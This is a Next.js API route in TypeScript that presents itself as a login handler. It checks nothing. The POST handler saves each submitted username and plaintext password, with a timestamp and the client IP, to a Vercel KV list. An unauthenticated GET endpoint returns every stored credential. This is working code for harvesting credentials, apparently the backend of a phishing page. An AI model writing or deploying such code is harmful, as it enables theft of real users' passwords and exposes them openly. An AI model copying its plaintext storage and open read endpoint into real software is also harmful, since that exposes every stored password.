import { NextRequest, NextResponse } from 'next/server';
import { kv } from '@vercel/kv';

// Define the type for our login data
interface LoginData {
  username: string;
  password: string;
  timestamp: string;
  ip?: string;
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { username, password } = body;

    // Basic validation
    if (!username || !password) {
      return NextResponse.json(
        { error: 'Username and password are required' },
        { status: 400 }
      );
    }

    // Get IP address from headers
    let ip = 'unknown';
    const forwardedFor = request.headers.get('x-forwarded-for');
    const realIp = request.headers.get('x-real-ip');
    
    if (forwardedFor) {
      ip = forwardedFor.split(',')[0].trim();
    } else if (realIp) {
      ip = realIp;
    }

    // Create the data object
    const loginData: LoginData = {
      username,
      password,
      timestamp: new Date().toISOString(),
      ip
    };

    // Store data in Vercel KV
    const loginsKey = 'logins';
    const existingLogins = await kv.get<LoginData[]>(loginsKey) || [];
    const updatedLogins = [...existingLogins, loginData];
    await kv.set(loginsKey, updatedLogins);

    return NextResponse.json(
      { message: 'Login data stored successfully' },
      { status: 200 }
    );
  } catch (error) {
    console.error('Error storing login data:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}

// GET endpoint to retrieve login data
export async function GET() {
  try {
    const logins = await kv.get<LoginData[]>('logins') || [];
    return NextResponse.json(logins, { status: 200 });
  } catch (error) {
    console.error('Error reading login data:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}